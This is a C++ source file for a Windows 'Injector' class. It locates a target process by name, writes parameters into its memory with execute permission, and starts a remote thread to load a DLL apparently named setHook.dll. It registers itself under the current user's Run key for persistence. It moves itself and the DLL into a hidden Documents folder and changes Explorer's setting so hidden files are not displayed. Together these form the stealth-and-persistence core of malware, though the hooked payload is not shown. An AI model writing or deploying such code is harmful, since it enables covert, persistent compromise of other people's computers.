#include "Injector.h"


Injector::Injector()
{
}


Injector::~Injector()
{
}

DWORD Injector::findProcess(std::wstring processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return (NULL);

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return (processInfo.th32ProcessID);
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return (processInfo.th32ProcessID);
		}
	}

	CloseHandle(processesSnapshot);
	return (NULL);
}

BOOL Injector::getTargetProcess(std::wstring processName)
{
	DWORD pid = 0;
	pid = findProcess(processName);

	this->_proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
		| PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
	if (this->_proc == NULL)
		return (FALSE);
	return (TRUE);
}

BOOL Injector::createPath(std::string dllName)
{
	CHAR	userNameA[MAX_USERNAME_SIZE];
	wchar_t	userNameW[MAX_USERNAME_SIZE];
	DWORD	sizeUsername = MAX_USERNAME_SIZE;
	BOOL	check = FALSE;

	if (GetUserNameW((LPWSTR)userNameW, &sizeUsername))
	{
		std::wstring userW(userNameW);
		this->_pathHiddenFile.append(L"C:\\Users\\");
		this->_pathHiddenFile.append(userW);
		this->_pathHiddenFile.append(L"\\Documents\\Injector\\");
		check = TRUE;
	}
	if (GetUserNameA((LPSTR)userNameA, &sizeUsername))
	{
		std::string userA(userNameA);
		this->_pathDll.append("C:\\Users\\");
		this->_pathDll.append(userA);
		this->_pathDll.append("\\Documents\\");
		this->_pathDll.append(dllName);
		check = TRUE;
	}
	return (check);
}


BOOL Injector::injectDll(HANDLE hProcess, LPCSTR lpModuleName, LPCSTR lpProcName, LPVOID lpParameters, SIZE_T dwParamSize)
{
	LPVOID	lpRemoteParams = NULL;
	SIZE_T	dwBytesWritten = 0;
	BOOL	result;
	HANDLE	hThread;
	LPVOID	lpFunctionAddress;

	lpFunctionAddress = GetProcAddress(GetModuleHandleA(lpModuleName), lpProcName);
	if (!lpParameters && !lpFunctionAddress)
	if (!(lpFunctionAddress = GetProcAddress(LoadLibraryA(lpModuleName), lpProcName)))
		return (FALSE);
	if (lpParameters)
	{
		if (!(lpRemoteParams = VirtualAllocEx(hProcess, NULL, dwParamSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
			return (FALSE);
		if (!(result = WriteProcessMemory(hProcess, lpRemoteParams, lpParameters, dwParamSize, &dwBytesWritten)))
			return (FALSE);
	}
	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpFunctionAddress, lpRemoteParams, NULL, NULL)))
		return (FALSE);
	return (TRUE);
}

BOOL Injector::checkStartingProcess(PCWSTR exeName)
{
	HKEY	hKey = NULL;
	DWORD	regType = REG_SZ;
	wchar_t	sizePath[MAX_PATH] = {};
	DWORD	len = sizeof(sizePath);
	BOOL	check = FALSE;

	if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == 0)
	{
		if (RegGetValueW(hKey, NULL, exeName, RRF_RT_REG_SZ, &regType, sizePath, &len) == ERROR_SUCCESS)
			check = TRUE;
		else
			check = FALSE;
	}
	if (hKey != NULL)
		RegCloseKey(hKey);
	return (check);
}

BOOL Injector::addToStartingProcess(PCWSTR exeName)
{
	HKEY	hKey = NULL;
	LONG	lResult = 0;
	DWORD	sizeFullPath;
	BOOL	check = FALSE;
	const size_t maxLength = MAX_PATH * 2;
	wchar_t fullPath[maxLength] = {};

	wcscpy_s(fullPath, maxLength, L"\"");
	wcscat_s(fullPath, maxLength, this->_pathHiddenFile.c_str());
	wcscat_s(fullPath, maxLength, L"\" ");

	if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL) == ERROR_SUCCESS)
	{
		sizeFullPath = (DWORD)((wcslen(fullPath) + 1) * 2);
		lResult = RegSetValueExW(hKey, exeName, 0, REG_SZ, (BYTE*)fullPath, sizeFullPath);
		check = TRUE;
	}

	if (hKey != NULL)
		RegCloseKey(hKey);

	return (check);
}

BOOL Injector::hideSources()
{
	CreateDirectoryW((LPCWSTR)this->_pathHiddenFile.c_str(), NULL);
	SetFileAttributesW((LPCWSTR)this->_pathHiddenFile.c_str(), FILE_ATTRIBUTE_HIDDEN);

	wchar_t currentPath[MAX_PATH];

	GetModuleFileNameW(NULL, currentPath, MAX_PATH);
	std::wstring cpyCurrentPath(currentPath);
	std::wstring cpyHiddenPath = this->_pathHiddenFile;

	size_t start_pos = cpyCurrentPath.find(L"injector.exe");
	cpyCurrentPath.replace(start_pos, 12, L"setHook.dll");
	cpyHiddenPath.append(L"setHook.dll");
	MoveFileW((LPCWSTR)cpyCurrentPath.c_str(), (LPCWSTR)cpyHiddenPath.c_str());

	this->_pathHiddenFile.append(L"injector.exe");
	MoveFileW(currentPath, (LPCWSTR)this->_pathHiddenFile.c_str());

	HKEY key;
	DWORD dwData = 0;

	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_WRITE, &key) == ERROR_SUCCESS)
	{
		if (RegSetValueEx(key, L"Hidden", 0, REG_DWORD, (LPBYTE)&dwData, sizeof(DWORD)))
			RegCloseKey(key);
		return (TRUE);
		RegCloseKey(key);
	}
	return (FALSE);
}

const HANDLE & Injector::getProcess()
{
	return (this->_proc);
}

const std::string & Injector::getPathDll()
{
	return (this->_pathDll);
}







int main()
{

	return (0);
}